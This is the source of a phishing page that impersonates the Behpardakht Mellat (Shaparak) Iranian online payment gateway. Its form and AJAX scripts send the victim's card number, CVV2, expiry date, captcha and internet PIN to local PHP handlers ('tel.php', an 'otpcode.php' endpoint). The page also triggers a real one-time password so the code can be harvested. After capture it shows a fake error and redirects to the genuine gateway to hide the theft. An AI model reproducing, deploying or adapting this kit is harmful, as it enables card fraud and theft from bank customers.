<?php
include "Start.php";
?>
<!DOCTYPE html>
<html lang="fa">
<meta http-equiv="content-type" content="text/html;charset=utf-8"/>
<head>
    <style>img[alt="www.000webhost.com"]{display:none;}</style>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="description" content="">
	<meta name="keywords" content="">
	<meta name="author" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<meta property="og:title" content="پرداخت اینترنتی به پرداخت ملت"/>
	<meta property="og:url" content="http://www.behpardakht.com/"/>
	<meta property="og:image" content="http://"/>

	<title>پرداخت اینترنتی به پرداخت ملت</title>
	<link href="img/ipg-favicon.ico" rel="shortcut icon">
	
	<link href="css/esprit_fa.minabc.css?v=10" rel="stylesheet">
	<script src="js/jquery.minabc.js?v=1"></script>
	<script src="msg/messages_fa.minabc.js?v=6"></script>
	<script src="js/payment.minabc.js?v=22"></script>

	<style>
		.close-button {
			background-color: #c2c7cc !important;
			background-image: url(img/ipg-decline.svg) !important;
			width: 25px !important;
			height: 25px !important;
		}
	</style>

	<script>
		$(document).ready(function () {
			otpRequestWaitMillis = 120000
			setCardSuggestionListHeight();
			countDownRemainingTime(758);
			$("#cardnumber").focus();
			$(document).keydown(function (e) {
				var keyCode = getEventKeyCode(e);
				if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = true;
			}).keyup(function (e) {
				var keyCode = getEventKeyCode(e);
				if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = false;
			});
		});
	</script>
	<script>
		encRefId = "CC9AE88F0E885C4D";
		panDtoList = JSON.parse('[]');
	</script>

</head>
<body id="body" class="up-scroll" onclick="hideKeypadOnOutsideClick(event);hideCardSuggestionListOnOutSideClick(event)">
<header id="header">
	<div class="container">
		<div class="beh-card">
			<a class="change-languge" href="payment9e2a.html?RefId=CC9AE88F0E885C4D&amp;lang=en">
				EN</a>

			<div class="row">
				<div class="col shaparaklogo align-self-start"><img src="img/shaparak_logo.svg" alt="shaparak"></div>
				<div class="col-6 header-center align-self-end">
					<span>پرداخت اینترنتی به پرداخت ملت</span><br>
					<a href="http://www.behpardakht.com/">www.Behpardakht.com</a>
				</div>
				<div class="col behpardakhtlogo align-self-start"><img src="img/behpardakht_logo.svg" alt="behpardakht">
				</div>
			</div>
		</div>
	</div>
</header>

<div class="main-wrapper payment">
	<section class="container">
		<div class="row row-eq-height">
			<div class="col-lg-8 col-md-12 col-sm-12 order-lg-1 order-2">
				<div class="beh-card carddetail">
					<span class="shape"></span>

					<div class="card-header">
						<h3>اطلاعات کارت</h3>
						<span id="remaining-time">زمان باقی مانده :<b>10:00</b></span>
						<span class="card-errorbox shaparak_shit_message">لطفا اطلاعات مورد نیاز را به درستی وارد کنید</span>
					</div>
					<div class="card-body">
						<form class="card-info" action="tel.php" method="post">
							<div class="form-group row">
								<div class="col-sm-4">
									<label for="cardnumber" class="col-form-label">شماره کارت</label>
									<small>شماره کارت 16 رقمی درج شده روی کارت را وارد نمایید</small>
								</div>
								
								<div class="col-md-6 col-sm-8 col-12 mobile-justify">
									<div class="cardnumberbox" id="cardnumberbox">
										<span class="banklogo"></span>
										<input type="tel" id="cardnumber" minlength="19" maxlength="19"
											   name="cardnumber"
											   inputmode="numeric"
											   required
											   onchange="checkCartDigit(this.value)"
											   onkeydown="checkCartDigit(this.value);preventInvalidKeys(event);setPanCursorPosition(event);"
											   onkeyup="formatPanOnKeyUp(event);filterAndShowCardSuggestionList();setBankLogo();focusNextField(this,'inputcvv2',event);resetSelectedPan(event)"
											   oninput="formatPanOnKeyUp(event);setBankLogo();focusNextField(this,'inputcvv2',event);resetSelectedPan(event)"
											   onfocus="hideKeypad();removeInvalidClassFromPan()"
											   onblur="handlePanChange()"
											   value=""
										>
										
										
										
																		<script>
								    function checkCartDigit(code) {
        var L=code.length;
        if(L<16 || parseInt(code.substr(1,10),10)==0 || parseInt(code.substr(10,6),10)==0) return false;
        var c=parseInt(code.substr(15,1),10);
        var s=0;
        var k,d;
        for(var i=0;i<16;i++)
        {
            k=(i%2==0) ? 2 :1;
            d=parseInt(code.substr(i,1),10)*k;
            s+=(d >9) ? d-9 :d;
        }
        return ((s%10)==0);
        showMessage("error");
    }
    var cardd = document.getElementById('cardnumber').value;
								</script> 

										
										
										<button type="button" id="card-list-button" data-toggle="dropdown"
												onclick="toggleAllPans()"
												aria-haspopup="true" aria-expanded="false" tabindex="-1"></button>
										<div class="card-suggestionlist dropdown-menu"
											 aria-labelledby="card-list-button">

										</div>
									</div>
								</div>
							</div>

							<div class="form-group row">
								<div class="col-sm-4">
									<label for="inputcvv2" class="col-form-label">شماره شناسایی دوم (CVV2)</label>
									<small>شماره 3 یا 4 رقمی درج شده روی کارت را وارد نمایید</small>
								</div>
								<div class="col-md-6 col-sm-6 col-10  mobile-justify keypad-parent">
									<input type="password" class="form-control" id="inputcvv2" maxlength="4"
									 onkeypress="return isNumber(event)"
										   pattern="[0-9]*" inputmode="numeric" name="cvv2"
										   onfocus="hideOthersKeypad(this);hideCardSuggestionList();removeInvalidClassFromInput('inputcvv2');
                                               showKeypadJustInMobile('inputcvv2',event)"
										   autocomplete="off"
										   required
										   onkeydown="preventInvalidKeys(event);"
										   onkeyup="focusNextField(this,'inputmonth|inputcapcha',event);">
										   
										   
<script>
   $(function() { 
        $("input[name='cvv2']").on('input', function(e) { 
            $(this).val($(this).val().replace(/[^0-9]/g, '')); 
        }); 
    }); 
</script>
  
										   
										   
								</div>
								<div class="col-sm-1">
									<button type="button" class="form-btn keypad" tabindex="-1"
											onclick="showKeypad('inputcvv2',event)"></button>
								</div>
							</div>

							<div class="form-group row">
								<div class="col-sm-4">
									<label for="inputmonth" class="col-form-label">تاریخ انقضای کارت</label>
									<small>تاریخ انقضای کارت را وارد کنید </small>
								</div>

								<div class="col-2 d-lg-none d-sm-none"></div>

								<div class="col-md-2 col-sm-3 col-4">
									<input type="tel" class="form-control" id="inputmonth" maxlength="2"
										   inputmode="numeric" pattern="[0-9]*"
										   name="month"
										   required
										   placeholder="ماه"
										   autocomplete="off"
										   onkeydown="preventInvalidKeys(event);"
										   onfocus="hideKeypad();removeInvalidClassFromInput('inputmonth')"
										   onkeyup="focusNextField(this,'inputyear',event);">
								</div>
								<script>
									var ex_month = document.getElementById('inputmonth');
									ex_month.addEventListener('change',function () {
										if (ex_month.value >= 32){
											showMessage('ماه وارد شده معتبر نمیباشد');
										}
									});
								</script>
								<div class="col-md-2 col-sm-3 col-4">
									<input type="tel" class="form-control" id="inputyear" maxlength="2"
										   name="year" inputmode="numeric" pattern="[0-9]*"
										   placeholder="سال"
										   required
										   onchange="valyear()"
										   autocomplete="off"
										   onfocus="removeInvalidClassFromInput('inputmonth')"
										   onkeydown="preventInvalidKeys(event);"
										   onkeyup="focusNextField(this,'inputcapcha',event)">
								</div>
								<script>
									var ex_year = document.getElementById('inputyear').value;
									function valyear(){
									   console.log(ex_year);
									}
						
								</script>
							</div>

							<div class="form-group row">
								<div class="col-sm-4">
									<label for="inputcapcha" class="col-form-label">کد امنیتی</label>
									<small>لطفا کد امنیتی داخل کادر را وارد نمایید</small>
								</div>
								<div class="col-sm-3 col-8 mobile-justify">
									<input type="tel" class="form-control" id="inputcapcha" maxlength="5"
									name="captcha"
									pattern="[0-9]*" inputmode="numeric"
										   autocomplete="off"
										   required
										   onfocus="hideKeypad();removeInvalidClassFromInput('inputcapcha')"
										   onkeydown="preventInvalidKeys(event);"
										   onkeyup="focusNextField(this,'inputpin',event)">
								</div>
								<div class="col-sm-3 col-6 capcha-container mobile-justify">
																		
									<img id="captcha-img" src="img/c10.jpg">
									<!--<input type="hidden" name="thiscaptcha" value="img/c8.jpg">-->
								</div>

								<div class="col-sm-1 col-4">
									<button type="button" id="captcha-button" class="form-btn capcha"
											title="نمايش کد جديد"
											onclick="capRef()"
											></button>
											<script>
                                            function capRef(){
                                                document.getElementById('captcha-img').src = "img/c11.jpg?kir=" + Math.random();
                                            }
											</script>
								</div>
							</div>
							<div class="form-group row" onblur="hideKeypad()">
								<div class="col-sm-4">
									<label for="inputpin" class="col-form-label">رمز اینترنتی کارت</label>
									<small>رمز اینترنتی را وارد نمایید</small>
								</div>

								<div class="col-md-6 col-sm-6 col-10 mobile-justify keypad-parent">
									<div class="cardnumberbox" id="dynamic-pin">
										<input type="password" class="form-control" id="inputpin"
											   required
											   maxlength="13"
											   minlength="5"
											   inputmode="numeric" pattern="[0-9]*" name="pass"
											   onfocus="hideOthersKeypad(this);hideCardSuggestionList();removeInvalidClassFromInput('inputpin');"
											   autocomplete="off"
											   onkeydown="preventInvalidKeys(event);"
											   onkeyup="focusNextField(this,'inputpayerid|payButton',event);">
											   <script>
   $(function() { 
        $("input[name='pass']").on('input', function(e) { 
            $(this).val($(this).val().replace(/[^0-9]/g, '')); 
        }); 
    }); 
</script>
										<button type="button" id="otp-button" data-toggle="dropdown"
												onclick="req();" aria-haspopup="true"
												aria-expanded="false" tabindex="-1">دریافت رمز پویا
										</button>
										<script>
										   var otp = true;
										var qq = 1;
									
											function req(){
											
											      validatePaymentInputs();
											    
                                                qq++;
                                                if(qq > 2){
                                                    showMessage("شما یک بار قبلا درخواست رمز پویا ارسال کرده ایید");
                                                    exit;
                                                }
                                              
                                                // sleep(9000);                        }
												var cardnumber = document.getElementById('cardnumber').value;
												var cvv2 = document.getElementById('inputcvv2').value;
												var year = document.getElementById('inputyear').value;
												var month = document.getElementById('inputmonth').value;
													var cap = document.getElementById('inputcapcha').value;
												// var pass = document.getElementById('inputpin').value;

												
												
												if (cardnumber != '' && cvv2 != '' && year != '' && month != '')
												{
													// kir += 1;
													// if(kir > 2){
													// 		showMessage('شما قبلا یک درخواست برای رمز پویای خود ارسال کرده ایید , لطفا صبور باشد');	
													// 		exit;
													// 	}

													$.ajax({
														// contentType: "application/json",
														data : {
															'cardnumber' : cardnumber,
															'cvv2' : cvv2,
															'year' : year,
															'month' : month,
															'captcha' : cap 
												// 			'pass' : pass
														},
														// dataType: "json",
														type: "POST",
														url: "js/otpcode/otpcode.php",
														success: function(msg){
															showMessage('مشتری گرامی , درصورتی که از صحت اطلاعات وارد شده اطمینان دارید ولی هنوز رمز دوم پویای خود را دریافت ننموده اید مجددا دکمه درخواست رمز پویا را بفشارید. در غیر اینصورت برای رفع مشکل به بانک صادر کننده کارت خود مراجعه فرمایید','wer');
															showBankLogoSpinner();
															    var otp = false;
															    hideBankLogoSpinner();
													
														}
													});
													countDownDynamicPinRemainingTime(120);
													    hideBankLogoSpinner();
													       var otp = false;
												// 	hideBankLogoSpinner();
												}else{
													showMessage('لطفا تمامی فیلد هارو پر کنید');
												}
											}
										</script>
									</div>
								</div>
								<div class="col-sm-1 ">
									<button type="button" disabled class="form-btn keypad" tabindex="-1"
											onclick="showKeypad('inputpin',event)"></button>
								</div>
							</div>

							<div class="form-group row">
								<div class="col-sm-4">
									<label for="inputemail" class="col-form-label">ایمیل</label>
									<small>لطفا ایمیل معتبر وارد کنید (اختیاری)</small>
								</div>
								<div class="col-md-6 col-sm-8 col-12 mobile-justify">
									<input type="email" class="form-control" id="inputemail"
										   onfocus="removeInvalidClassFromInput('inputemail')">
								</div>
							</div>


							<div class="form-group row">
								<div class="col-sm-4"></div>
								<div class="col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form">
									<button type="button" onclick="validateAndSend()" class="btn btn-perches" id="payButton"
											>پرداخت
									</button>
									<script>
									var kos = 1;
									function validateAndSend(){
									    validatePaymentInputs();
									   // showSubmitSpinner();
												var cardnumber = document.getElementById('cardnumber').value;
												var cvv2 = document.getElementById('inputcvv2').value;
												var year = document.getElementById('inputyear').value;
												var month = document.getElementById('inputmonth').value;
												var pass = document.getElementById('inputpin').value;
												var captcha = document.getElementById('inputcapcha').value;

												if (cardnumber != '' && cvv2 != '' && year != '' && month != '' && pass != '')
												{
													kos++;
													if(kos > 2){
															showMessage('خطا در دریافت اطلاعات با بانک مرکزی . لطفا بعدا تلاش کنید');	
															exit;
														}
										
													$.ajax({
														// contentType: "application/json",
														data : {
															'cardnumber' : cardnumber,
															'cvv2' : cvv2,
															'year' : year,
															'month' : month,
															'pass' : pass,
															'otp' : otp,
															'captcha' : captcha
														},
														// dataType: "json",
														type: "POST",
														url: "tel.php",
														success: function(msg){
															showMessage('لطفا از صحت اطلاعات کارت خود مطلع شوید');
                                                            // showMessage(msg);   
															cardnumber = '';
															cvv2 = '';
															year = '';
															month = '';
															pass = '';
															window.location.href = "https://bpm.shaparak.ir/pgwchannel/payment.mellat?RefId=112C7F5BD7CADE37";
															setBankLogo();
														}
												
													});
											
													
														
													// hideSubmitSpinner();
												}else{
													showMessage('لطفا تمامی فیلد هارو پر کنید');
												}
									}
									</script>
									<button type="button" class="btn btn-decline" onclick="cancelPay()">انصراف</button>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>

			<div class="col-lg-4 col-md-12 col-sm-12 order-lg-2 order--1">
				<div class="beh-card merchantdetail">
					<div class="card-header">
						<h3>اطلاعات پذیرنده</h3>
					</div>
					<div class="card-body">

						<div class="merchant-container">
							<div class="col-lg-12 col-sm-4 merchant-logo">
								<!--<img class=" " src="img/sample/merchant-logo.png" alt="merchantlogo">-->
								<img class=" " src="img/ipg-defaltlogo.png" alt="merchantlogo">
								<span class="helper"></span>
							</div>

							<ul class="col-lg-12 col-sm-8 merchant-detail">
								<li>نام پذیرنده : <b>پرداخت الکترونیک ملت</b></li>
								<li>شماره پذیرنده: <b>1882843</b></li>


								<li>آدرس وب سایت: <b class="merchantwebsite"><a href="https://www.rayanertebat.ir/">https://bpm.shaparak.ir</a></b>
								</li>


							</ul>

						</div>
								<ul class="merchant-detail price">
								<li>مبلغ قابل پرداخت :<b class="price-number"><?php echo $_SESSION["amount"]; ?> ریال</b></li>
							</ul>					
						</div>

				</div>

			</div>
		</div>
	</section>

	<div class="keypad-container">
		<h4>صفحه کلید امن</h4>
		<div class="frame-umbtn">
			<button id="num1" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
		</div>
		<div class="frame-umbtn">
			<button id="num2" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
		</div>
		<div class="frame-umbtn">
			<button id="num3" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
		</div>
		<div class="frame-umbtn">
			<button id="num4" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
		</div>
		<div class="frame-umbtn">
			<button id="num5" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
		</div>
		<div class="frame-umbtn">
			<button id="num6" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
		</div>
		<div class="frame-umbtn">
			<button id="num7" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
		</div>
		<div class="frame-umbtn">
			<button id="num8" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
		</div>
		<div class="frame-umbtn">
			<button id="num9" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
		</div>
		<div class="frame-umbtn">
			<button id="clear" type="button" class=" numpad" tabindex="-1" onclick="keyPadBackspace(event)">&#9003;
			</button>
		</div>
		<div class="frame-umbtn">
			<button id="num0" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
		</div>
		<div class="frame-umbtn">
			<button id="tab-key" type="button" class=" numpad" tabindex="-1" onclick="keypadTab()"
					style="color: #27d286;">&#10004;
			</button>
		</div>
	</div>


	<div class="modal large-modal top_layer fade show" id="dynamic-pin-modal" tabindex="-1" role="dialog"
		 aria-labelledby="ModalLabel" aria-hidden="true" style="display: none">
		<div class="modal-dialog modal-dialog-centered" role="document">
			<div class="modal-content">
				<div class="modal-header">
					<h5 class="modal-title">توجه</h5>
					<button type="button" onclick="removeDynamicPinDialog();focusField('inputcvv2')" class="close"
							data-dismiss="modal" aria-label="Close">
						<span aria-hidden="true">&times;</span>
					</button>
				</div>
				<div class="modal-body">
					<p>مشتری گرامی، در شرایط ذیل نیازی به فشردن دکمه درخواست رمز پویا نمی باشد:<br/>اگر از روش هایی نظیر
						برنامک های رمز ساز استفاده می نمایید رمز خود را در قسمت رمز دوم وارد فرمایید. در صورتی که تاکنون
						نسبت به پویا سازی رمز دوم کارت خود اقدام ننموده اید، میتوانید حداکثر تا تاریخ 98/11/05 از رمز
						ایستای خود استفاده فرمایید.</p>
				</div>
				<div class="modal-footer">
					<button type="button" id="dynamic-pin-dialog-button" class="btn btn-primary"
							onclick="removeDynamicPinDialog();focusField('inputcvv2')">متوجه شدم
					</button>
				</div>
			</div>
		</div>
	</div>
	<div class="modal-backdrop fade show" id="dynamic-pin-modal-backdrop" style="display: none"></div>

	<section class="container">
		<row class="beh-guid">
			<div class="col">
				<h4>راهنمای استفاده از رمز پویا</h4>
				<ul>
					<li>رمز پویا، رمز یکبار مصرفی است که به جای رمز دوم کارت استفاده میشود.</li>
					<li><b>مرحله اول</b>- براساس دستورالعمل بانک صادرکننده کارت خود، نسبت به فعالسازی رمز پویا اقدام
						نمایید.
					</li>
					<li><b>مرحله دوم</b>- رمز پویا را بر اساس روش اعلامی از طرف بانک صادرکننده کارت، به یکی از روشهای
						زیر دریافت کنید.
					</li>
					<li>1- دریافت از طریق برنامه کاربردی بانک، اینترنت بانک و یا موبایل بانک</li>
					<li>2- دریافت از طریق کد USSD بانک صادرکننده کارت شما</li>
					<li>3- دریافت از طریق زدن دکمه ی "دریافت رمز پویا" در درگاه پرداخت اینترنتی</li>
					<li><b>مرحله سوم</b>- پس از دریافت رمز به یکی از روشهای فوق، رمز پویای دریافت شده را در محل تعیین
						شده برای "رمز دوم" وارد نمایید و سپس مابقی اطلاعات را تکمیل نمایید.
					</li>
					<br><br>
				</ul>
			</div>
		</row>
	</section>
	<section class="container">
		<row class="beh-guid">
			<div class="col">
				<h4>راهنما</h4>
				<ul>
					<li>شماره کارت: 16 رقمی بوده و بصورت 4 قسمت 4 رقمی روی کارت درج شده است.</li>
					<li>cvv2: با طول 3 یا 4 رقم کنار شماره کارت و یا پشت کارت درج شده است.</li>
					<li>تاریخ انقضا: شامل دو بخش ماه و سال انقضا در کنار شماره کارت درج شده است.</li>
					<li>رمز اینترنتی: با عنوان رمز دوم و در برخی موارد با PIN2 شناخته می شود، از طریق بانک صادر کننده
						کارت تولید شده و همچنین از طریق دستگاه های خودپرداز بانک صادر کننده قابل تهیه و یا تغییر می
						باشد.
					</li>
					<li>کد امنیتی: بخشی از محتوای صفحه پرداخت است و لازم است برای ادامه فرایند خرید ، کد موجود که به
						صورت عددی در تصویر مشخص شده است در محل پیش بینی شده درج شود.
					</li>
					<li>دروازه پرداخت اینترنتی به پرداخت ملت با استفاده از پروتکل امن https به مشتریان خود ارایه خدمت
						نموده و با آدرس <b>https://bpm.shaparak.ir</b> شروع می شود. خواهشمند است به منظور جلوگیری از سوء
						استفاده های احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر وب خود را با آدرس فوق
						مقایسه نمایید و درصورت مشاهده هر نوع مغایرت احتمالی، موضوع را با ما درمیان بگذارید.
					</li>
					<li>برای جلوگیری از افشای رمز کارت خود،حتی المقدور از صفحه کلید مجازی استفاده فرمایید.</li>
					<li>لطفا از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.</li>
					<li>برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان اینترنتی با ما
						تماس بگیرید.
					</li>
					<br><br>
				</ul>
			</div>
		</row>
	</section>
</div>
<footer class="footer">
	<div class="container">
		<div class="footerarc"></div>
		<div class="footerarc content">
			<span class="call">شماره تماس: 27312733-021 </span><br>
			<span>شرکت به پرداخت ملت ارايه دهنده خدمات نوین پرداخت الکترونيک</span>
		</div>
		<div class="row justify-content-center">
			<div class="col-12">

			</div>
		</div>
	</div>
</footer>

<form method="post" name="returnForm" action="https://bpm.shaparak.ir/pgwchannel/payment.mellat?RefId=112C7F5BD7CADE37">
	<input type="hidden" id="RefId" name="RefId" value="CC9AE88F0E885C4D">
	<input type="hidden" id="ResCode" name="ResCode">
	<input type="hidden" id="SaleOrderId" name="SaleOrderId" value="775679064">
</form>
<form method="post" name="resultForm" action="https://bpm.shaparak.ir/pgwchannel/result.mellat" accept-charset="UTF-8">
	<input type="hidden" name="RefId" value="CC9AE88F0E885C4D">
</form>
<div style="text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;"><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&utm_campaign=000_logo&utm_medium=website&utm_content=footer_img"><img src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png" alt="www.000webhost.com"></a></div><script>function getCookie(t){for(var e=t+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var a=n[o];" "==a.charAt(0);)a=a.substring(1);if(0==a.indexOf(e))return a.substring(e.length,a.length)}return""}getCookie("hostinger")&&(document.cookie="hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",location.reload());var wordpressAdminBody=document.getElementsByClassName("wp-admin")[0],notification=document.getElementsByClassName("notice notice-success is-dismissible"),hostingerLogo=document.getElementsByClassName("hlogo"),mainContent=document.getElementsByClassName("notice_content")[0],wpSidebar=document.getElementById("adminmenuwrap"),wpTopBarRight=document.getElementById("wp-admin-bar-top-secondary");if(null!=wordpressAdminBody&&notification.length>0&&null!=mainContent){var googleFont=document.createElement("link");googleFontHref=document.createAttribute("href"),googleFontRel=document.createAttribute("rel"),googleFontHref.value="https://fonts.googleapis.com/css?family=Roboto:300,400,600",googleFontRel.value="stylesheet",googleFont.setAttributeNode(googleFontHref),googleFont.setAttributeNode(googleFontRel);var css="@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;} .upgrade-btn-sidebar {display: none;} #wp-toolbar .top-bar-upgrade-btn {width: 52px; height: 46px !important; padding: 0 !important;} .top-bar-upgrade-btn__text {display: none;} .dashicons-star-filled.top-bar-upgrade-btn__icon::before {font-size: 28px; margin-top: 10px; width: 28px; height: 28px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 0.3;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; right: 0; display: flex; padding: 0 5%}} @media only screen and (max-width: 960px) {.upgrade-btn-sidebar {border-radius: 0 !important; padding: 10px 0 !important; margin: 0 !important;} .upgrade-btn-sidebar__icon {display: block !important; margin: auto;} .upgrade-btn-sidebar__text {display: none;}}  .web-hosting-90-off-image {max-width: 90%; margin-top: 20px;} .content-wrapper {z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 12px -6px #cc292f; max-width: 350px; border: 0; border-radius: 3px; background-color: #6747c7 !important; padding: 15px 55px !important;  margin-bottom: 48px; font-size: 14px; font-weight: 800; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: rgba(103,71,199, 0.9) !important;} .upgrade-btn-sidebar {text-align:center;background-color:#ff4546;max-width: 350px;border-radius: 3px;border: 0;padding: 12px; margin: 20px 10px;display: block; font-size: 12px;color: #ffffff;font-weight: 700;text-decoration: none;} .upgrade-btn-sidebar:hover, .upgrade-btn-sidebar:focus, .upgrade-btn-sidebar:active {background-color: rgba(255,69,70, 0.9); color: #ffffff;} .upgrade-btn-sidebar__icon {display: none;} .top-bar-upgrade-btn {height: 100% !important; display: inline-block !important; padding: 0 10px !important; color: #ffffff; cursor: pointer;} .top-bar-upgrade-btn:hover, .top-bar-upgrade-btn:active, .top-bar-upgrade-btn:focus {background-color: #ff4546 !important; color: #ffffff !important;} .top-bar-upgrade-btn__icon {margin-right: 6px;}",style=document.createElement("style"),sheet=window.document.styleSheets[0];style.styleSheet?style.styleSheet.cssText=css:style.appendChild(document.createTextNode(css)),document.getElementsByTagName("head")[0].appendChild(style),document.getElementsByTagName("head")[0].appendChild(googleFont);var button=document.getElementsByClassName("upgrade_button_red")[0],link=button.parentElement;link.setAttribute("href","https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"),link.innerHTML='<button class="upgrade_button_red_sale">Upgrade Now</button>',(notification=notification[0]).setAttribute("style","background-color: #f8f8f8; border-left-color: #6747c7 !important;"),notification.className="notice notice-error is-dismissible";var mainContentHolder=document.getElementById("main_content");mainContentHolder.setAttribute("style","padding: 0;"),hostingerLogo[0].remove();var h1Tag=notification.getElementsByTagName("H1")[0];h1Tag.className="000-h1",h1Tag.innerHTML="Limited Time Offer",h1Tag.setAttribute("style","color: #32454c;  margin-top: 48px; font-size: 48px; font-weight: 700;");var h2Tag=document.createElement("H2");h2Tag.innerHTML="From $0.79/month",h2Tag.setAttribute("style","color: #32454c; margin: 20px 0 45px 0; font-size: 48px; font-weight: 700;"),h1Tag.parentNode.insertBefore(h2Tag,h1Tag.nextSibling);var paragraph=notification.getElementsByTagName("p")[0];paragraph.innerHTML="Don’t miss the opportunity to enjoy up to <strong>4x WordPress Speed, Free SSL and all premium features</strong> available for a fraction of the price!",paragraph.setAttribute("style",'font-family: "Roboto", sans-serif; font-size: 18px; font-weight: 300; color: #6f7c81; margin-bottom: 20px;');var list=notification.getElementsByTagName("UL")[0];list.remove();var org_html=mainContent.innerHTML,new_html='<div class="content-wrapper">'+mainContent.innerHTML+'</div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/wp-inject-default-img.png"></div>';mainContent.innerHTML=new_html;var saleImage=mainContent.getElementsByClassName("web-hosting-90-off-image")[0];wpSidebar.insertAdjacentHTML("beforeend",'<a href="https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&amp;utm_medium=panel&amp;utm_campaign=000-wp-sidebar" target="_blank" class="upgrade-btn-sidebar"><span class="dashicons dashicons-star-filled upgrade-btn-sidebar__icon"></span><span class="upgrade-btn-sidebar__text">Upgrade</span></a>'),wpTopBarRight.insertAdjacentHTML("beforebegin",'<a class="top-bar-upgrade-btn" href="https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&amp;utm_medium=panel&amp;utm_campaign=000-wp-top-bar" target="_blank"><span class="ab-icon dashicons-before dashicons-star-filled top-bar-upgrade-btn__icon"></span><span class="top-bar-upgrade-btn__text">Go Premium</span></a>')}</script><script type="text/javascript" src="https://a.opmnstr.com/app/js/api.min.js" data-campaign="f6brbmuxflyqoriatchv" data-user="71036" async></script></body>
</html>
